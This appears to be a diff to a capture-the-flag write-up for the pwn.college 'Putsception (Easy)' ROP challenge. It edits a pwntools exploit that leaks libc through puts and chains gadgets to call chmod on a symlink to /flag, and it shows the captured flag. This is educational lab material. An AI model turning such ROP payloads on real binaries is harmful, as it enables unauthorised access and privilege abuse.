@@ -6798,10 +6798,13 @@ context.arch = 'amd64'
 # ROP gadgets
 pop_rdi = 0x402223
 pop_rsi_pop_r15 = 0x402221
+
 # PLT entries
 puts_plt = 0x401110
+
 # GOT entries
 puts_got = 0x405028
+
 # Memory addresses and offsets
 start_func_addr = 0x4011b0
 bang_addr = 0x403606
@@ -6838,7 +6841,7 @@ print(f"\n[+] puts@libc: {hex(puts_libc)}")
 print(f"[+] libc_base: {hex(libc_base)}")
 print(f"[+] chmod@libc: {hex(chmod_libc)}\n")
 
-# --- STAGE 2: CHMOD ---
+# --- STAGE 2: Modify permissions for /flag using symlinks ---
 # Wait for the binary to restart and reach the second prompt
 p.recvuntil(b"resourceful.") 
 
@@ -6846,6 +6849,7 @@ log.info("Sending Stage 2: chmod('!', 0o777)")
 payload2 = flat(
     b"A" * offset,
     
+    # chmod("!", 0o777)
     pop_rdi, bang_addr,      
     pop_rsi_pop_r15, 0o777, b"B" * 8, 
     chmod_libc
@@ -6897,4 +6901,12 @@ $
 ```
 hacker@return-oriented-programming~putsception-easy:~$ cat /flag 
 pwn.college{oLES8Yo4ZJFl1m52C_WB44G-Smt.0VN1MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Putsception (Hard)
+
+```
+
 ```
